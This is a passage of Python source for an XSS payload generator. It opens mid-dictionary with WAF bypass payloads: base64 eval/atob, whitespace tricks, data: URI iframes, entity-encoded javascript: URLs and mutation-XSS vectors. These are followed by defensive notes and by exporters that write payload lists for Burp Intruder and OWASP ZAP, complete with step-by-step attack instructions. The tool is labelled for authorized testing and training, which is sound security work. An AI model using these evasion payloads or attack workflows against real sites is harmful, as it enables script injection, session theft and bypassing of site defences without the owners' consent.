            'base64_eval': {
                'original': "alert('XSS')",
                'bypassed': "eval(atob('YWxlcnQoJ1hTUycpOw=='))",
                'explanation': 'Base64 encoding hides the actual JavaScript payload from WAF inspection when combined with eval/atob.',
                'waf_reason': 'WAFs cannot detect base64 encoded payloads without decoding them first',
                'defense': 'Block eval() and atob() combinations. Monitor for base64 patterns in JavaScript context.'
            },
            'whitespace_manipulation': {
                'original': '<script>alert("XSS")</script>',
                'bypassed': '<script >alert("XSS")</script >',
                'explanation': 'Extra whitespace inside HTML tags is valid HTML but can confuse regex-based WAF matching.',
                'waf_reason': 'Regex pattern misses tags with extra space before closing bracket',
                'defense': 'Normalize whitespace before pattern matching. Use proper HTML parsers.'
            },
            'data_uri': {
                'original': '<script>alert("XSS")</script>',
                'bypassed': '<iframe src="data:text/html,<script>alert(1)</script>">',
                'explanation': 'Data URIs embed HTML/JS directly in attributes, creating self-contained XSS payloads.',
                'waf_reason': 'WAFs checking href/src for "javascript:" miss the data: URI scheme',
                'defense': 'Restrict allowed URI schemes to http/https only. Block data: and javascript: URIs.'
            },
            'protocol_bypass': {
                'original': 'javascript:alert(1)',
                'bypassed': 'j&#x61;v&#x61;script:alert(1)',
                'explanation': 'HTML entity encoding within the javascript: protocol can bypass URL-based WAF filters.',
                'waf_reason': 'WAFs checking for "javascript:" string miss entity-encoded versions',
                'defense': 'Decode all entities before URL validation. Use URL parsers, not regex, for scheme checking.'
            },
            'mutation_xss': {
                'original': '<script>alert("XSS")</script>',
                'bypassed': '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
                'explanation': 'mXSS exploits browser HTML parsing behavior where sanitized markup mutates into executable code after DOM insertion.',
                'waf_reason': 'WAF sees safe markup but browser DOM parser creates different structure that executes JS',
                'defense': 'Use proven sanitization libraries (DOMPurify). Test sanitizers against mXSS vectors specifically.'
            }
        }
        
        # ===== DEFENSIVE NOTES =====
        self.defensive_notes = {
            'input_validation': {
                'title': 'Input Validation',
                'description': 'Validate all user input on both client and server side',
                'implementation': [
                    'Whitelist allowed characters using strict regex',
                    'Reject input containing HTML special characters',
                    'Validate input length and format',
                    'Never rely on client-side validation alone'
                ],
                'owasp_ref': 'OWASP Input Validation Cheat Sheet'
            },
            'output_encoding': {
                'title': 'Output Encoding',
                'description': 'Encode output based on the context where data will be rendered',
                'implementation': [
                    'HTML context: encode <, >, ", \', &',
                    'JavaScript context: use \\uXXXX encoding',
                    'URL context: use percent encoding',
                    'CSS context: encode special CSS characters',
                    'Use libraries: ESAPI, DOMPurify, bleach'
                ],
                'owasp_ref': 'OWASP XSS Prevention Cheat Sheet'
            },
            'csp': {
                'title': 'Content Security Policy (CSP)',
                'description': 'HTTP header that controls which resources browser can load',
                'implementation': [
                    "Content-Security-Policy: default-src 'self'",
                    "Block inline scripts: script-src 'nonce-{random}'",
                    'Prevent data: URIs: img-src https:',
                    'Report violations: report-uri /csp-report',
                    'Test with CSP Evaluator tool'
                ],
                'owasp_ref': 'OWASP Content Security Policy Cheat Sheet'
            },
            'httponly_cookies': {
                'title': 'HTTPOnly & Secure Cookies',
                'description': 'Cookie flags that prevent JavaScript access and enforce HTTPS',
                'implementation': [
                    'Set HttpOnly flag: prevents document.cookie access',
                    'Set Secure flag: cookie only sent over HTTPS',
                    'Set SameSite=Strict: prevents CSRF',
                    'Example: Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict'
                ],
                'owasp_ref': 'OWASP Session Management Cheat Sheet'
            },
            'waf': {
                'title': 'Web Application Firewall (WAF)',
                'description': 'Filters malicious HTTP traffic before it reaches the application',
                'implementation': [
                    'Use ModSecurity with OWASP Core Rule Set',
                    'Enable paranoia level 2 or higher',
                    'Monitor and tune rules to reduce false positives',
                    'WAF is defense-in-depth, NOT the only protection'
                ],
                'owasp_ref': 'OWASP Web Application Firewall'
            },
            'sanitization': {
                'title': 'HTML Sanitization',
                'description': 'Clean user-supplied HTML to remove malicious content',
                'implementation': [
                    'Use DOMPurify for client-side sanitization',
                    'Use bleach (Python) or HtmlSanitizer (.NET)',
                    'Whitelist allowed tags and attributes only',
                    'Never use regex for HTML sanitization',
                    'Test against mXSS vectors'
                ],
                'owasp_ref': 'OWASP XSS Filter Evasion Cheat Sheet'
            },
            'framework_protection': {
                'title': 'Framework Auto-Escaping',
                'description': 'Modern frameworks provide automatic XSS protection',
                'implementation': [
                    'React: JSX auto-escapes by default',
                    'Angular: built-in sanitization pipeline',
                    'Django: auto-escaping in templates',
                    'Never use dangerouslySetInnerHTML (React)',
                    'Never use innerHTML with user data'
                ],
                'owasp_ref': 'OWASP DOM-based XSS Prevention'
            }
        }
    
    # =========================================================================
    # CORE GENERATION
    # =========================================================================
    
    def generate(self, xss_type=None, context=None, encoding=None, include_bypass=False, include_explanation=False):
        """Generate XSS payloads based on parameters"""
        results = []
        
        types_to_generate = [xss_type] if xss_type else ['reflected', 'stored', 'dom']
        
        for xss_t in types_to_generate:
            if xss_t not in self.payloads:
                continue
            
            contexts_to_use = [context] if context else self.payloads[xss_t].keys()
            
            for ctx in contexts_to_use:
                if ctx not in self.payloads[xss_t]:
                    continue
                
                for payload_dict in self.payloads[xss_t][ctx]:
                    result = {
                        'type': xss_t,
                        'context': ctx,
                        'original': payload_dict['payload'],
                        'encoded': self._encode(payload_dict['payload'], encoding) if encoding else payload_dict['payload'],
                        'description': payload_dict['description'],
                        'severity': payload_dict['severity'],
                        'encoding_used': encoding if encoding else 'none'
                    }
                    results.append(result)
        
        if include_bypass:
            for technique, details in self.bypass_techniques.items():
                bypass_result = {
                    'type': 'bypass_technique',
                    'context': 'general',
                    'technique': technique,
                    'original': details['original'],
                    'bypassed': details['bypassed'],
                    'explanation': details['explanation'],
                    'waf_reason': details['waf_reason'],
                    'defense': details['defense'],
                    'severity': 'Educational'
                }
                results.append(bypass_result)
        
        return results
    
    def _encode(self, payload, method):
        """Encode payload using specified method"""
        if method == 'url':
            return urllib.parse.quote(payload)
        elif method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif method == 'hex':
            return ''.join([f'%{ord(c):02x}' for c in payload])
        elif method == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        return payload
    
    def _ensure_output_dir(self, filepath):
        """Ensure output directory exists before writing"""
        os.makedirs(os.path.dirname(filepath), exist_ok=True)

    # =========================================================================
    # DISPLAY
    # =========================================================================
    
    def display_cli(self, payloads):
        """Display payloads in CLI format"""
        print("\n" + "=" * 80)
        print(f"{'XSS PAYLOAD TEMPLATES':^80}")
        print("=" * 80 + "\n")
        
        regular_payloads = [p for p in payloads if p.get('type') != 'bypass_technique']
        bypass_payloads  = [p for p in payloads if p.get('type') == 'bypass_technique']
        
        for idx, p in enumerate(regular_payloads, 1):
            print(f"[{idx}] Type: {p['type'].upper()} | Context: {p['context'].upper()} | Severity: {p['severity']}")
            print(f"Description : {p['description']}")
            print(f"Payload     : {p['encoded']}")
            if p.get('encoding_used') and p['encoding_used'] != 'none':
                print(f"Encoding    : {p['encoding_used'].upper()}")
            print("-" * 80)
        
        if bypass_payloads:
            print("\n" + "=" * 80)
            print(f"{'WAF BYPASS TECHNIQUES (EDUCATIONAL)':^80}")
            print("=" * 80 + "\n")
            
            for idx, bp in enumerate(bypass_payloads, 1):
                print(f"[B{idx}] Technique: {bp['technique'].replace('_', ' ').title()}")
                print(f"Original    : {bp['original']}")
                print(f"Bypassed    : {bp['bypassed']}")
                print(f"Why it works: {bp['explanation']}")
                print(f"WAF weakness: {bp['waf_reason']}")
                print(f"Defense     : {bp['defense']}")
                print("-" * 80)
    
    def display_defensive_notes(self):
        """Display defensive notes"""
        print("\n" + "="*80)
        print(" "*20 + "DEFENSIVE NOTES & WAF EXPLANATIONS")
        print("="*80 + "\n")
        
        for key, note in self.defensive_notes.items():
            print(f"[*] {note['title']}")
            print(f"    {note['description']}")
            print(f"    Implementation:")
            for item in note['implementation']:
                print(f"    - {item}")
            print(f"    Reference: {note['owasp_ref']}")
            print("-"*80)
    
    # =========================================================================
    # EXPORTS
    # =========================================================================
    
    def export_json(self, payloads, filename='payloads/output/xss/xss_payloads.json'):
        """Export payloads to JSON file"""
        self._ensure_output_dir(filename)
        output_data = {
            'generated_at': datetime.now().isoformat(),
            'tool': 'XSS Payload Generator',
            'author': 'Offensive Team Zeta - ITSOLERA',
            'version': '2.0',
            'warning': 'FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY',
            'payload_count': len(payloads),
            'payloads': payloads
        }
        with open(filename, 'w') as f:
            json.dump(output_data, f, indent=4)
        print(f"\n✅ JSON exported  → {filename}")
        return filename
    
    def export_txt(self, payloads, filename='payloads/output/xss/xss_payloads.txt'):
        """Export payloads to plain text catalog"""
        self._ensure_output_dir(filename)
        with open(filename, 'w') as f:
            f.write("="*80 + "\n")
            f.write("XSS PAYLOAD CATALOG - EDUCATIONAL USE ONLY\n")
            f.write(f"Generated : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("Author    : Offensive Team Zeta - ITSOLERA (PVT) LTD\n")
            f.write("WARNING   : Use only on authorized systems with permission\n")
            f.write("="*80 + "\n\n")
            
            for idx, p in enumerate(payloads, 1):
                if p.get('type') == 'bypass_technique':
                    f.write(f"[BYPASS {idx}] {p['technique'].replace('_', ' ').title()}\n")
                    f.write(f"Original   : {p['original']}\n")
                    f.write(f"Bypassed   : {p['bypassed']}\n")
                    f.write(f"Explanation: {p['explanation']}\n")
                else:
                    f.write(f"[{idx}] {p['type'].upper()} XSS - {p['context'].upper()} Context\n")
                    f.write(f"Severity   : {p['severity']}\n")
                    f.write(f"Description: {p['description']}\n")
                    f.write(f"Payload    : {p['encoded']}\n")
                    if p.get('encoding_used') and p['encoding_used'] != 'none':
                        f.write(f"Encoding   : {p['encoding_used'].upper()}\n")
                f.write("-" * 80 + "\n\n")
        
        print(f"✅ TXT exported   → {filename}")
        return filename
    
    def export_burp(self, payloads, filename='payloads/output/xss/xss_burp_payloads.txt'):
        """
        Export payloads in Burp Suite Intruder format.
        
        HOW TO USE IN BURP SUITE:
          1. Proxy → Intercept a request from your authorized target
          2. Right-click → Send to Intruder
          3. Intruder → Positions → highlight injection point → Add §
          4. Intruder → Payloads → Payload type: Simple list
          5. Click Load → select this file
          6. Start Attack (authorized lab / DVWA only)
        
        NOTE: Exports templates only - no live traffic is sent by this tool.
        """
        self._ensure_output_dir(filename)
        
        section_order = ['reflected', 'stored', 'dom']
        sections = {t: [] for t in section_order}
        bypass_list = []
        
        for p in payloads:
            if p.get('type') == 'bypass_technique':
                bypass_list.append(p)
            elif p.get('type') in sections:
                sections[p['type']].append(p)
        
        with open(filename, 'w') as f:
            # ── Header ────────────────────────────────────────────────────────
            f.write("# " + "="*76 + "\n")
            f.write("# BURP SUITE INTRUDER PAYLOAD LIST\n")
            f.write("# Tool    : XSS Payload Generator\n")
            f.write(f"# Author  : Offensive Team Zeta - ITSOLERA (PVT) LTD\n")
            f.write(f"# Created : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# Usage   : Burp Suite > Intruder > Payloads > Load > (this file)\n")
            f.write("# WARNING : Use ONLY on authorized targets with written permission\n")
            f.write("# " + "="*76 + "\n\n")
            
            f.write("# HOW TO USE:\n")
            f.write("#   1. Open Burp Suite → Proxy → Intercept a request\n")
            f.write("#   2. Right-click → Send to Intruder\n")
            f.write("#   3. Intruder → Positions → mark your injection point (Add §)\n")
            f.write("#   4. Intruder → Payloads → Payload type: Simple list\n")
            f.write("#   5. Click Load → select this file\n")
            f.write("#   6. Click Start Attack (authorized lab / DVWA ONLY)\n\n")
            
            # ── Payload sections ──────────────────────────────────────────────
            for xss_type in section_order:
                type_payloads = sections[xss_type]
                if not type_payloads:
                    continue
                f.write("# " + "="*76 + "\n")
                f.write(f"# {xss_type.upper()} XSS PAYLOADS\n")
                f.write("# " + "="*76 + "\n")
                for p in type_payloads:
                    f.write(f"# [{p['severity']}] {p['description']}\n")
                    f.write(f"{p['encoded']}\n")
                f.write("\n")
            
            # ── Bypass section ─────────────────────────────────────────────────
            if bypass_list:
                f.write("# " + "="*76 + "\n")
                f.write("# WAF BYPASS / EVASION PAYLOADS\n")
                f.write("# " + "="*76 + "\n")
                for bp in bypass_list:
                    f.write(f"# Technique : {bp['technique'].replace('_', ' ').title()}\n")
                    f.write(f"# Why it works: {bp['explanation']}\n")
                    f.write(f"{bp['bypassed']}\n\n")
        
        print(f"✅ Burp exported  → {filename}")
        print("   Import: Burp > Intruder > Payloads > Load")
        return filename
    
    def export_zap(self, payloads, filename='payloads/output/xss/xss_zap_payloads.txt'):
        """
        Export payloads in OWASP ZAP Fuzzer format.
        
        HOW TO USE IN OWASP ZAP:
          1. Start ZAP → Manual Explore → browse to localhost/DVWA
          2. Find the target request in History tab
          3. Right-click → Attack → Fuzz
          4. Highlight the injection point in the request
          5. Payloads → Add → Type: File → select this file
          6. Start Fuzzer (offline / authorized lab only)
        
        NOTE: Offline mode only. No live requests sent by this tool.
        """
        self._ensure_output_dir(filename)
        
        with open(filename, 'w') as f:
            # ── Header ────────────────────────────────────────────────────────
            f.write("# " + "="*76 + "\n")
            f.write("# OWASP ZAP FUZZER PAYLOAD LIST\n")
            f.write("# Tool    : XSS Payload Generator\n")
            f.write(f"# Author  : Offensive Team Zeta - ITSOLERA (PVT) LTD\n")
            f.write(f"# Created : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# Usage   : ZAP > Fuzzer > Payloads > Add > File > (this file)\n")
            f.write("# Mode    : Offline testing on authorized lab (e.g. DVWA) only\n")
            f.write("# WARNING : Use ONLY on authorized targets with written permission\n")
            f.write("# " + "="*76 + "\n\n")
            
            f.write("# HOW TO USE IN OWASP ZAP:\n")
            f.write("#   1. Start ZAP → Manual Explore → browse to localhost/DVWA\n")
            f.write("#   2. Find the target request in the History tab\n")
            f.write("#   3. Right-click the request → Attack → Fuzz\n")
            f.write("#   4. In the Fuzz dialog, highlight the injection point\n")
            f.write("#   5. Payloads → Add → Type: File → select this file\n")
            f.write("#   6. Click Start Fuzzer (authorized lab / DVWA ONLY)\n\n")
            
            # ── All regular payloads (one per line, ZAP standard format) ──────
            f.write("# " + "="*76 + "\n")
            f.write("# ALL XSS PAYLOADS (one per line - ZAP format)\n")
            f.write("# " + "="*76 + "\n")
            
            for p in payloads:
                if p.get('type') != 'bypass_technique':
                    # ZAP reads one payload per line; inline comment shows context
                    f.write(f"# [{p['type'].upper()} / {p['context'].upper()} / {p['severity']}] {p['description']}\n")
                    f.write(f"{p['encoded']}\n")
            
            # ── Bypass payloads ───────────────────────────────────────────────
            bypass_list = [p for p in payloads if p.get('type') == 'bypass_technique']
            if bypass_list:
                f.write("\n# " + "="*76 + "\n")
                f.write("# WAF BYPASS PAYLOADS\n")
                f.write("# " + "="*76 + "\n")
                for bp in bypass_list:
                    f.write(f"# Technique   : {bp['technique'].replace('_', ' ').title()}\n")
                    f.write(f"# Explanation : {bp['explanation']}\n")
                    f.write(f"{bp['bypassed']}\n\n")
        
        print(f"✅ ZAP exported   → {filename}")
        print("   Import: ZAP > Fuzzer > Payloads > Add > File")
        return filename
    
    # =========================================================================
    # STATS
    # =========================================================================
    
    def get_stats(self):
        """Get payload statistics"""
        stats = {
            'total_payloads': 0,
            'by_type': {},
            'by_severity': {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        }
        
        for xss_type, contexts in self.payloads.items():
            stats['by_type'][xss_type] = 0
            for context, payload_list in contexts.items():
                stats['by_type'][xss_type] += len(payload_list)
                stats['total_payloads'] += len(payload_list)
                for p in payload_list:
                    severity = p.get('severity', 'Unknown')
                    if severity in stats['by_severity']:
                        stats['by_severity'][severity] += 1
        
        return stats


if __name__ == '__main__':
    gen = XSSGenerator()
    stats = gen.get_stats()
    print(f"Total payloads : {stats['total_payloads']}")
    print(f"By type        : {stats['by_type']}")
    print(f"By severity    : {stats['by_severity']}")
